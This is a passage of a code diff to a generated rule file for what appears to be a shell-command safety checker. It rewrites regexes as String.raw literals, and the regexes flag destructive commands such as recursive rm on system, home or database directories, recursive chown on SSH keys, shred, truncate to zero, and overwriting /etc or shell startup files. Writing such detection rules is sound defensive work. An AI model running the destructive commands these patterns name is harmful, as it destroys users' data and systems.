][^\\s=]*|o(?:[^l\\s=][^\\s=]*|l(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?|r(?:[^es\\s=][^\\s=]*|e(?:[^am\\s=][^\\s=]*|a(?:[^d\\s=][^\\s=]*|d(?:[^\\-\\s=][^\\s=]*|-(?:[^b\\s=][^\\s=]*|b(?:[^a\\s=][^\\s=]*|a(?:[^t\\s=][^\\s=]*|t(?:[^c\\s=][^\\s=]*|c(?:[^h\\s=][^\\s=]*|h(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?|m(?:[^o\\s=][^\\s=]*|o(?:[^t\\s=][^\\s=]*|t(?:[^e\\s=][^\\s=]*|e(?:[^\\-\\s=][^\\s=]*|-(?:[^o\\s=][^\\s=]*|o(?:[^p\\s=][^\\s=]*|p(?:[^t\\s=][^\\s=]*|t(?:[^i\\s=][^\\s=]*|i(?:[^o\\s=][^\\s=]*|o(?:[^n\\s=][^\\s=]*|n(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?)?|s(?:[^hy\\s=][^\\s=]*|h(?:[^\\s=][^\\s=]*)|y(?:[^n\\s=][^\\s=]*|n(?:[^c\\s=][^\\s=]*|c(?:[^\\-\\s=][^\\s=]*|-(?:[^p\\s=][^\\s=]*|p(?:[^a\\s=][^\\s=]*|a(?:[^t\\s=][^\\s=]*|t(?:[^h\\s=][^\\s=]*|h(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?|s(?:[^kotu\\s=][^\\s=]*|k(?:[^i\\s=][^\\s=]*|i(?:[^p\\s=][^\\s=]*|p(?:[^\\-\\s=][^\\s=]*|-(?:[^c\\s=][^\\s=]*|c(?:[^o\\s=][^\\s=]*|o(?:[^m\\s=][^\\s=]*|m(?:[^p\\s=][^\\s=]*|p(?:[^r\\s=][^\\s=]*|r(?:[^e\\s=][^\\s=]*|e(?:[^s\\s=][^\\s=]*|s(?:[^s\\s=][^\\s=]*|s(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?)?|o(?:[^c\\s=][^\\s=]*|c(?:[^k\\s=][^\\s=]*|k(?:[^o\\s=][^\\s=]*|o(?:[^p\\s=][^\\s=]*|p(?:[^t\\s=][^\\s=]*|t(?:[^s\\s=][^\\s=]*|s(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|t(?:[^o\\s=][^\\s=]*|o(?:[^p\\s=][^\\s=]*|p(?:[^\\-\\s=][^\\s=]*|-(?:[^a\\s=][^\\s=]*|a(?:[^ft\\s=][^\\s=]*|f(?:[^t\\s=][^\\s=]*|t(?:[^e\\s=][^\\s=]*|e(?:[^r\\s=][^\\s=]*|r(?:[^\\s=][^\\s=]*))?)?)?|t(?:[^\\s=][^\\s=]*))?)?)?)?)?|u(?:[^f\\s=][^\\s=]*|f(?:[^f\\s=][^\\s=]*|f(?:[^i\\s=][^\\s=]*|i(?:[^x\\s=][^\\s=]*|x(?:[^\\s=][^\\s=]*))?)?)?)?)?|t(?:[^ei\\s=][^\\s=]*|e(?:[^m\\s=][^\\s=]*|m(?:[^p\\s=][^\\s=]*|p(?:[^\\-\\s=][^\\s=]*|-(?:[^d\\s=][^\\s=]*|d(?:[^i\\s=][^\\s=]*|i(?:[^r\\s=][^\\s=]*|r(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|i(?:[^m\\s=][^\\s=]*|m(?:[^e\\s=][^\\s=]*|e(?:[^o\\s=][^\\s=]*|o(?:[^u\\s=][^\\s=]*|u(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|u(?:[^s\\s=][^\\s=]*|s(?:[^e\\s=][^\\s=]*|e(?:[^r\\s=][^\\s=]*|r(?:[^m\\s=][^\\s=]*|m(?:[^a\\s=][^\\s=]*|a(?:[^p\\s=][^\\s=]*|p(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|w(?:[^r\\s=][^\\s=]*|r(?:[^i\\s=][^\\s=]*|i(?:[^t\\s=][^\\s=]*|t(?:[^e\\s=][^\\s=]*|e(?:[^\\-\\s=][^\\s=]*|-(?:[^b\\s=][^\\s=]*|b(?:[^a\\s=][^\\s=]*|a(?:[^t\\s=][^\\s=]*|t(?:[^c\\s=][^\\s=]*|c(?:[^h\\s=][^\\s=]*|h(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?|z(?:[^c\\s=][^\\s=]*|c(?:[^\\s=][^\\s=]*))?))\\s+)?(?:-[a-dg-zAC-LN-SU-Z0-9]*n[a-zA-Z0-9]*|--dry-run)(?:\\s+(?:[^\\-\\s]\\S*|-(?:[^\\-d\\s]\\S*|-(?:[^dn\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?|n(?:[^o\\s]\\S*|o(?:[^\\-\\s]\\S*|-(?:[^d\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?)?)?)?)?|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*)?)?)?))*\\s*$",
+						String.raw`^rsync\s+(?:(?:(?:[^-\s]\S*|-[^-\s]\S*|--\S+)\s+)*?(?:[^-\s]\S*|-[^-\sBefTM@]|-[^-\s]\S*[^\sBefTM@]|--[^\s=]+=\S*|--(?:[^abcdefgilmoprstuwz\s=][^\s=]*|a(?:[^d\s=][^\s=]*|d(?:[^d\s=][^\s=]*|d(?:[^r\s=][^\s=]*|r(?:[^e\s=][^\s=]*|e(?:[^s\s=][^\s=]*|s(?:[^s\s=][^\s=]*|s(?:[^\s=][^\s=]*))?)?)?)?)?)?|b(?:[^alw\s=][^\s=]*|a(?:[^c\s=][^\s=]*|c(?:[^k\s=][^\s=]*|k(?:[^u\s=][^\s=]*|u(?:[^p\s=][^\s=]*|p(?:[^\-\s=][^\s=]*|-(?:[^d\s=][^\s=]*|d(?:[^i\s=][^\s=]*|i(?:[^r\s=][^\s=]*|r(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?|l(?:[^o\s=][^\s=]*|o(?:[^c\s=][^\s=]*|c(?:[^k\s=][^\s=]*|k(?:[^\-\s=][^\s=]*|-(?:[^s\s=][^\s=]*|s(?:[^i\s=][^\s=]*|i(?:[^z\s=][^\s=]*|z(?:[^e\s=][^\s=]*|e(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?|w(?:[^l\s=][^\s=]*|l(?:[^i\s=][^\s=]*|i(?:[^m\s=][^\s=]*|m(?:[^i\s=][^\s=]*|i(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?|c(?:[^cho\s=][^\s=]*|c(?:[^\s=][^\s=]*)|h(?:[^emo\s=][^\s=]*|e(?:[^c\s=][^\s=]*|c(?:[^k\s=][^\s=]*|k(?:[^s\s=][^\s=]*|s(?:[^u\s=][^\s=]*|u(?:[^m\s=][^\s=]*|m(?:[^\-\s=][^\s=]*|-(?:[^cs\s=][^\s=]*|c(?:[^h\s=][^\s=]*|h(?:[^o\s=][^\s=]*|o(?:[^i\s=][^\s=]*|i(?:[^c\s=][^\s=]*|c(?:[^e\s=][^\s=]*|e(?:[^\s=][^\s=]*))?)?)?)?)?|s(?:[^e\s=][^\s=]*|e(?:[^e\s=][^\s=]*|e(?:[^d\s=][^\s=]*|d(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?|m(?:[^o\s=][^\s=]*|o(?:[^d\s=][^\s=]*|d(?:[^\s=][^\s=]*))?)?|o(?:[^w\s=][^\s=]*|w(?:[^n\s=][^\s=]*|n(?:[^\s=][^\s=]*))?)?)?|o(?:[^mnp\s=][^\s=]*|m(?:[^p\s=][^\s=]*|p(?:[^ar\s=][^\s=]*|a(?:[^r\s=][^\s=]*|r(?:[^e\s=][^\s=]*|e(?:[^\-\s=][^\s=]*|-(?:[^d\s=][^\s=]*|d(?:[^e\s=][^\s=]*|e(?:[^s\s=][^\s=]*|s(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?)?|r(?:[^e\s=][^\s=]*|e(?:[^s\s=][^\s=]*|s(?:[^s\s=][^\s=]*|s(?:[^\-\s=][^\s=]*|-(?:[^cl\s=][^\s=]*|c(?:[^h\s=][^\s=]*|h(?:[^o\s=][^\s=]*|o(?:[^i\s=][^\s=]*|i(?:[^c\s=][^\s=]*|c(?:[^e\s=][^\s=]*|e(?:[^\s=][^\s=]*))?)?)?)?)?|l(?:[^e\s=][^\s=]*|e(?:[^v\s=][^\s=]*|v(?:[^e\s=][^\s=]*|e(?:[^l\s=][^\s=]*|l(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?)?|n(?:[^ft\s=][^\s=]*|f(?:[^i\s=][^\s=]*|i(?:[^g\s=][^\s=]*|g(?:[^\s=][^\s=]*))?)?|t(?:[^i\s=][^\s=]*|i(?:[^m\s=][^\s=]*|m(?:[^e\s=][^\s=]*|e(?:[^o\s=][^\s=]*|o(?:[^u\s=][^\s=]*|u(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?)?|p(?:[^y\s=][^\s=]*|y(?:[^\-\s=][^\s=]*|-(?:[^ad\s=][^\s=]*|a(?:[^s\s=][^\s=]*|s(?:[^\s=][^\s=]*))?|d(?:[^e\s=][^\s=]*|e(?:[^s\s=][^\s=]*|s(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?|d(?:[^ep\s=][^\s=]*|e(?:[^b\s=][^\s=]*|b(?:[^u\s=][^\s=]*|u(?:[^g\s=][^\s=]*|g(?:[^\s=][^\s=]*))?)?)?|p(?:[^a\s=][^\s=]*|a(?:[^r\s=][^\s=]*|r(?:[^a\s=][^\s=]*|a(?:[^m\s=][^\s=]*|m(?:[^\s=][^\s=]*))?)?)?)?)?|e(?:[^ax\s=][^\s=]*|a(?:[^r\s=][^\s=]*|r(?:[^l\s=][^\s=]*|l(?:[^y\s=][^\s=]*|y(?:[^\-\s=][^\s=]*|-(?:[^i\s=][^\s=]*|i(?:[^n\s=][^\s=]*|n(?:[^p\s=][^\s=]*|p(?:[^u\s=][^\s=]*|u(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?|x(?:[^c\s=][^\s=]*|c(?:[^l\s=][^\s=]*|l(?:[^u\s=][^\s=]*|u(?:[^d\s=][^\s=]*|d(?:[^e\s=][^\s=]*|e(?:[^\-\s=][^\s=]*|-(?:[^f\s=][^\s=]*|f(?:[^r\s=][^\s=]*|r(?:[^o\s=][^\s=]*|o(?:[^m\s=][^\s=]*|m(?:[^\s=][^\s=]*))?)?)?)?))?)?)?)?)?)?|f(?:[^i\s=][^\s=]*|i(?:[^l\s=][^\s=]*|l(?:[^et\s=][^\s=]*|e(?:[^s\s=][^\s=]*|s(?:[^\-\s=][^\s=]*|-(?:[^f\s=][^\s=]*|f(?:[^r\s=][^\s=]*|r(?:[^o\s=][^\s=]*|o(?:[^m\s=][^\s=]*|m(?:[^\s=][^\s=]*))?)?)?)?)?)?|t(?:[^e\s=][^\s=]*|e(?:[^r\s=][^\s=]*|r(?:[^\s=][^\s=]*))?)?)?)?)?|g(?:[^r\s=][^\s=]*|r(?:[^o\s=][^\s=]*|o(?:[^u\s=][^\s=]*|u(?:[^p\s=][^\s=]*|p(?:[^m\s=][^\s=]*|m(?:[^a\s=][^\s=]*|a(?:[^p\s=][^\s=]*|p(?:[^\s=][^\s=]*))?)?)?)?)?)?)?|i(?:[^cn\s=][^\s=]*|c(?:[^o\s=][^\s=]*|o(?:[^n\s=][^\s=]*|n(?:[^v\s=][^\s=]*|v(?:[^\s=][^\s=]*))?)?)?|n(?:[^cf\s=][^\s=]*|c(?:[^l\s=][^\s=]*|l(?:[^u\s=][^\s=]*|u(?:[^d\s=][^\s=]*|d(?:[^e\s=][^\s=]*|e(?:[^\-\s=][^\s=]*|-(?:[^f\s=][^\s=]*|f(?:[^r\s=][^\s=]*|r(?:[^o\s=][^\s=]*|o(?:[^m\s=][^\s=]*|m(?:[^\s=][^\s=]*))?)?)?)?))?)?)?)?|f(?:[^o\s=][^\s=]*|o(?:[^\s=][^\s=]*))?)?)?|l(?:[^io\s=][^\s=]*|i(?:[^n\s=][^\s=]*|n(?:[^k\s=][^\s=]*|k(?:[^\-\s=][^\s=]*|-(?:[^d\s=][^\s=]*|d(?:[^e\s=][^\s=]*|e(?:[^s\s=][^\s=]*|s(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?)?|o(?:[^g\s=][^\s=]*|g(?:[^\-\s=][^\s=]*|-(?:[^f\s=][^\s=]*|f(?:[^io\s=][^\s=]*|i(?:[^l\s=][^\s=]*|l(?:[^e\s=][^\s=]*|e(?:[^\-\s=][^\s=]*|-(?:[^f\s=][^\s=]*|f(?:[^o\s=][^\s=]*|o(?:[^r\s=][^\s=]*|r(?:[^m\s=][^\s=]*|m(?:[^a\s=][^\s=]*|a(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?))?)?|o(?:[^r\s=][^\s=]*|r(?:[^m\s=][^\s=]*|m(?:[^a\s=][^\s=]*|a(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?|m(?:[^aio\s=][^\s=]*|a(?:[^x\s=][^\s=]*|x(?:[^\-\s=][^\s=]*|-(?:[^ads\s=][^\s=]*|a(?:[^l\s=][^\s=]*|l(?:[^l\s=][^\s=]*|l(?:[^o\s=][^\s=]*|o(?:[^c\s=][^\s=]*|c(?:[^\s=][^\s=]*))?)?)?)?|d(?:[^e\s=][^\s=]*|e(?:[^l\s=][^\s=]*|l(?:[^e\s=][^\s=]*|e(?:[^t\s=][^\s=]*|t(?:[^e\s=][^\s=]*|e(?:[^\s=][^\s=]*))?)?)?)?)?|s(?:[^i\s=][^\s=]*|i(?:[^z\s=][^\s=]*|z(?:[^e\s=][^\s=]*|e(?:[^\s=][^\s=]*))?)?)?)?)?)?|i(?:[^n\s=][^\s=]*|n(?:[^\-\s=][^\s=]*|-(?:[^s\s=][^\s=]*|s(?:[^i\s=][^\s=]*|i(?:[^z\s=][^\s=]*|z(?:[^e\s=][^\s=]*|e(?:[^\s=][^\s=]*))?)?)?)?)?)?|o(?:[^d\s=][^\s=]*|d(?:[^i\s=][^\s=]*|i(?:[^f\s=][^\s=]*|f(?:[^y\s=][^\s=]*|y(?:[^\-\s=][^\s=]*|-(?:[^w\s=][^\s=]*|w(?:[^i\s=][^\s=]*|i(?:[^n\s=][^\s=]*|n(?:[^d\s=][^\s=]*|d(?:[^o\s=][^\s=]*|o(?:[^w\s=][^\s=]*|w(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?)?)?|o(?:[^nu\s=][^\s=]*|n(?:[^l\s=][^\s=]*|l(?:[^y\s=][^\s=]*|y(?:[^\-\s=][^\s=]*|-(?:[^w\s=][^\s=]*|w(?:[^r\s=][^\s=]*|r(?:[^i\s=][^\s=]*|i(?:[^t\s=][^\s=]*|t(?:[^e\s=][^\s=]*|e(?:[^\-\s=][^\s=]*|-(?:[^b\s=][^\s=]*|b(?:[^a\s=][^\s=]*|a(?:[^t\s=][^\s=]*|t(?:[^c\s=][^\s=]*|c(?:[^h\s=][^\s=]*|h(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?)?)?)?)?|u(?:[^t\s=][^\s=]*|t(?:[^\-b\s=][^\s=]*|-(?:[^f\s=][^\s=]*|f(?:[^o\s=][^\s=]*|o(?:[^r\s=][^\s=]*|r(?:[^m\s=][^\s=]*|m(?:[^a\s=][^\s=]*|a(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?|b(?:[^u\s=][^\s=]*|u(?:[^f\s=][^\s=]*|f(?:[^\s=][^\s=]*))?)?)?)?)?|p(?:[^aor\s=][^\s=]*|a(?:[^rs\s=][^\s=]*|r(?:[^t\s=][^\s=]*|t(?:[^i\s=][^\s=]*|i(?:[^a\s=][^\s=]*|a(?:[^l\s=][^\s=]*|l(?:[^\-\s=][^\s=]*|-(?:[^d\s=][^\s=]*|d(?:[^i\s=][^\s=]*|i(?:[^r\s=][^\s=]*|r(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?|s(?:[^s\s=][^\s=]*|s(?:[^w\s=][^\s=]*|w(?:[^o\s=][^\s=]*|o(?:[^r\s=][^\s=]*|r(?:[^d\s=][^\s=]*|d(?:[^\-\s=][^\s=]*|-(?:[^f\s=][^\s=]*|f(?:[^i\s=][^\s=]*|i(?:[^l\s=][^\s=]*|l(?:[^e\s=][^\s=]*|e(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?)?|o(?:[^r\s=][^\s=]*|r(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?|r(?:[^o\s=][^\s=]*|o(?:[^t\s=][^\s=]*|t(?:[^o\s=][^\s=]*|o(?:[^c\s=][^\s=]*|c(?:[^o\s=][^\s=]*|o(?:[^l\s=][^\s=]*|l(?:[^\s=][^\s=]*))?)?)?)?)?)?)?|r(?:[^es\s=][^\s=]*|e(?:[^am\s=][^\s=]*|a(?:[^d\s=][^\s=]*|d(?:[^\-\s=][^\s=]*|-(?:[^b\s=][^\s=]*|b(?:[^a\s=][^\s=]*|a(?:[^t\s=][^\s=]*|t(?:[^c\s=][^\s=]*|c(?:[^h\s=][^\s=]*|h(?:[^\s=][^\s=]*))?)?)?)?)?)?)?|m(?:[^o\s=][^\s=]*|o(?:[^t\s=][^\s=]*|t(?:[^e\s=][^\s=]*|e(?:[^\-\s=][^\s=]*|-(?:[^o\s=][^\s=]*|o(?:[^p\s=][^\s=]*|p(?:[^t\s=][^\s=]*|t(?:[^i\s=][^\s=]*|i(?:[^o\s=][^\s=]*|o(?:[^n\s=][^\s=]*|n(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?)?|s(?:[^hy\s=][^\s=]*|h(?:[^\s=][^\s=]*)|y(?:[^n\s=][^\s=]*|n(?:[^c\s=][^\s=]*|c(?:[^\-\s=][^\s=]*|-(?:[^p\s=][^\s=]*|p(?:[^a\s=][^\s=]*|a(?:[^t\s=][^\s=]*|t(?:[^h\s=][^\s=]*|h(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?|s(?:[^kotu\s=][^\s=]*|k(?:[^i\s=][^\s=]*|i(?:[^p\s=][^\s=]*|p(?:[^\-\s=][^\s=]*|-(?:[^c\s=][^\s=]*|c(?:[^o\s=][^\s=]*|o(?:[^m\s=][^\s=]*|m(?:[^p\s=][^\s=]*|p(?:[^r\s=][^\s=]*|r(?:[^e\s=][^\s=]*|e(?:[^s\s=][^\s=]*|s(?:[^s\s=][^\s=]*|s(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?)?|o(?:[^c\s=][^\s=]*|c(?:[^k\s=][^\s=]*|k(?:[^o\s=][^\s=]*|o(?:[^p\s=][^\s=]*|p(?:[^t\s=][^\s=]*|t(?:[^s\s=][^\s=]*|s(?:[^\s=][^\s=]*))?)?)?)?)?)?|t(?:[^o\s=][^\s=]*|o(?:[^p\s=][^\s=]*|p(?:[^\-\s=][^\s=]*|-(?:[^a\s=][^\s=]*|a(?:[^ft\s=][^\s=]*|f(?:[^t\s=][^\s=]*|t(?:[^e\s=][^\s=]*|e(?:[^r\s=][^\s=]*|r(?:[^\s=][^\s=]*))?)?)?|t(?:[^\s=][^\s=]*))?)?)?)?)?|u(?:[^f\s=][^\s=]*|f(?:[^f\s=][^\s=]*|f(?:[^i\s=][^\s=]*|i(?:[^x\s=][^\s=]*|x(?:[^\s=][^\s=]*))?)?)?)?)?|t(?:[^ei\s=][^\s=]*|e(?:[^m\s=][^\s=]*|m(?:[^p\s=][^\s=]*|p(?:[^\-\s=][^\s=]*|-(?:[^d\s=][^\s=]*|d(?:[^i\s=][^\s=]*|i(?:[^r\s=][^\s=]*|r(?:[^\s=][^\s=]*))?)?)?)?)?)?|i(?:[^m\s=][^\s=]*|m(?:[^e\s=][^\s=]*|e(?:[^o\s=][^\s=]*|o(?:[^u\s=][^\s=]*|u(?:[^t\s=][^\s=]*|t(?:[^\s=][^\s=]*))?)?)?)?)?)?|u(?:[^s\s=][^\s=]*|s(?:[^e\s=][^\s=]*|e(?:[^r\s=][^\s=]*|r(?:[^m\s=][^\s=]*|m(?:[^a\s=][^\s=]*|a(?:[^p\s=][^\s=]*|p(?:[^\s=][^\s=]*))?)?)?)?)?)?|w(?:[^r\s=][^\s=]*|r(?:[^i\s=][^\s=]*|i(?:[^t\s=][^\s=]*|t(?:[^e\s=][^\s=]*|e(?:[^\-\s=][^\s=]*|-(?:[^b\s=][^\s=]*|b(?:[^a\s=][^\s=]*|a(?:[^t\s=][^\s=]*|t(?:[^c\s=][^\s=]*|c(?:[^h\s=][^\s=]*|h(?:[^\s=][^\s=]*))?)?)?)?)?)?)?)?)?)?|z(?:[^c\s=][^\s=]*|c(?:[^\s=][^\s=]*))?))\s+)?(?:-[a-dg-zAC-LN-SU-Z0-9]*n[a-zA-Z0-9]*|--dry-run)(?:\s+(?:[^\-\s]\S*|-(?:[^\-d\s]\S*|-(?:[^dn\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?|n(?:[^o\s]\S*|o(?:[^\-\s]\S*|-(?:[^d\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?)?)?)?)?|d(?:[^r\s]\S*|r(?:[^y\s]\S*)?)?)?))*\s*$`,
 				},
 			],
 		},
@@ -473,13 +473,13 @@ export const GENERATED = {
 				"Recursively changing the owner of the root, home or current directory, a system directory or your SSH keys can break the system and lock you out.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)chown\\s+(?:\\S+\\s+)*(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*(\\/\\*?|~(?:\\/\\*)?|\\$HOME(?:\\/\\*)?|(?:~|\\$HOME)\\/\\.(?:ssh|gnupg)\\S*|\\.+|\\*|\\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|Users|Library|System)(?:\\/\\*)?|\\/(?:home|Users)\\/[^/\\s]+(?:\\/\\*?|\\/\\.(?:ssh|gnupg)\\S*)?)(?:\\s|$)",
+				String.raw`(?:^|\s)chown\s+(?:\S+\s+)*(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\s+(?:\S+\s+)*(\/\*?|~(?:\/\*)?|\$HOME(?:\/\*)?|(?:~|\$HOME)\/\.(?:ssh|gnupg)\S*|\.+|\*|\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|Users|Library|System)(?:\/\*)?|\/(?:home|Users)\/[^/\s]+(?:\/\*?|\/\.(?:ssh|gnupg)\S*)?)(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"^chown(?:\\s+-\\S+)*\\s+(?:\\$\\{?(?:USER|LOGNAME)\\}?|\\$\\(whoami\\)|\\$\\(id\\s+-u?n?\\))(?:[:.]\\S*)?(?:\\s+-\\S+)*(?:\\s+(?:\\.|\\*|(?:~|\\$HOME|\\$\\{HOME\\})/?|(?:~|\\$HOME|\\$\\{HOME\\}|/(?:home|Users)/[^/\\s]+)/[^.\\s]\\S*))+$",
+						String.raw`^chown(?:\s+-\S+)*\s+(?:\$\{?(?:USER|LOGNAME)\}?|\$\(whoami\)|\$\(id\s+-u?n?\))(?:[:.]\S*)?(?:\s+-\S+)*(?:\s+(?:\.|\*|(?:~|\$HOME|\$\{HOME\})/?|(?:~|\$HOME|\$\{HOME\}|/(?:home|Users)/[^/\s]+)/[^.\s]\S*))+$`,
 				},
 			],
 		},
@@ -489,7 +489,7 @@ export const GENERATED = {
 			description:
 				"Shred overwrites file data at the block level, making recovery impossible unlike rm.",
 			feed: "parsed",
-			regex: "(?:^|\\s)shred\\s+",
+			regex: String.raw`(?:^|\s)shred\s+`,
 			flags: "",
 			filters: [],
 		},
@@ -500,13 +500,13 @@ export const GENERATED = {
 				"This truncates the file to zero bytes and erases its contents.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)truncate\\s+(?:\\S+\\s+)*?-s\\s*0\\s+(?:\\S+\\s+)*?([^-\\s]\\S*)",
+				String.raw`(?:^|\s)truncate\s+(?:\S+\s+)*?-s\s*0\s+(?:\S+\s+)*?([^-\s]\S*)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"^truncate\\s+(?:-\\S+\\s+)*-s\\s*0\\s+(?:\\S+\\.log(?:\\.\\d+)?(?:\\s+|$))+$",
+						String.raw`^truncate\s+(?:-\S+\s+)*-s\s*0\s+(?:\S+\.log(?:\.\d+)?(?:\s+|$))+$`,
 				},
 			],
 		},
@@ -517,12 +517,12 @@ export const GENERATED = {
 				"The deletion target comes from a variable, from another command's output (xargs, find -exec) or from a link created earlier on the line, so it cannot be verified. An empty variable, unexpected input or a link to an important directory deletes far more than intended.",
 			feed: "parsed",
 			regex:
-				"^rm\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*?(\\{\\}|\\/?\\$\\{?\\w+\\}?(?:\\/\\*?)?)(?:\\s|$)",
+				String.raw`^rm\s+(?:\S+\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+(?:\S+\s+)*?(\{\}|\/?\$\{?\w+\}?(?:\/\*?)?)(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
-					value: "\\s\\$(?:HOME|\\{HOME\\})(?:/\\*?)?(?:\\s|$)",
+					value: String.raw`\s\$(?:HOME|\{HOME\})(?:/\*?)?(?:\s|$)`,
 				},
 			],
 		},
@@ -533,7 +533,7 @@ export const GENERATED = {
 				"This deletes everything inside a directory in your home folder.",
 			feed: "parsed",
 			regex:
-				"^rm\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*?((?:~|\\$HOME)\\/\\S+\\/\\*)(?:\\s|$)",
+				String.raw`^rm\s+(?:\S+\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+(?:\S+\s+)*?((?:~|\$HOME)\/\S+\/\*)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -544,7 +544,7 @@ export const GENERATED = {
 				"This deletes a database or container-engine data directory: every database, image or volume stored there is lost.",
 			feed: "parsed",
 			regex:
-				"^rm\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*?(\\/var\\/lib\\/(?:postgresql|pgsql|mysql|mariadb|docker|containerd|mongodb|mongo|redis|etcd|elasticsearch|opensearch|cassandra|kubelet|rabbitmq|influxdb|clickhouse|couchdb|neo4j)(?:\\/\\S*)?)(?:\\s|$)",
+				String.raw`^rm\s+(?:\S+\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+(?:\S+\s+)*?(\/var\/lib\/(?:postgresql|pgsql|mysql|mariadb|docker|containerd|mongodb|mongo|redis|etcd|elasticsearch|opensearch|cassandra|kubelet|rabbitmq|influxdb|clickhouse|couchdb|neo4j)(?:\/\S*)?)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -555,13 +555,13 @@ export const GENERATED = {
 				"This recursively deletes a top-level directory of the filesystem.",
 			feed: "parsed",
 			regex:
-				"^rm\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*?(\\/[^/\\s*$]+)(?:\\s|$)",
+				String.raw`^rm\s+(?:\S+\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+(?:\S+\s+)*?(\/[^/\s*$]+)(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"\\s/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications)(?:/\\*)?(?:\\s|$)",
+						String.raw`\s/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications)(?:/\*)?(?:\s|$)`,
 				},
 			],
 		},
@@ -572,7 +572,7 @@ export const GENERATED = {
 				"This writes to a system file or replaces a shell startup file. Overwriting it can break logins, networking or the whole system.",
 			feed: "parsed",
 			regex:
-				"(?:(?:^|\\s)\\d*(?:>>?|>\\||&>>?)\\s+|(?:^|\\s)tee\\s+(?:\\S+\\s+)*?)(\\/etc\\/\\S+|\\/boot\\/\\S+|\\/usr\\/\\S+|\\/s?bin\\/\\S+|\\/lib(?:64)?\\/\\S+|\\/System\\/\\S+)(?:\\s|$)|(?:(?:^|\\s)\\d*(?:>|>\\||&>)\\s+|(?:^|\\s)tee\\s+(?:(?:-[b-zA-Z]\\S*|--[b-z]\\S*|[^-\\s]\\S*)\\s+)*?)((?:~|\\$HOME)\\/\\.(?:bashrc|bash_profile|bash_login|profile|zshrc|zprofile|zshenv|zlogin|cshrc|tcshrc|config\\/fish\\/config\\.fish))(?:\\s|$)",
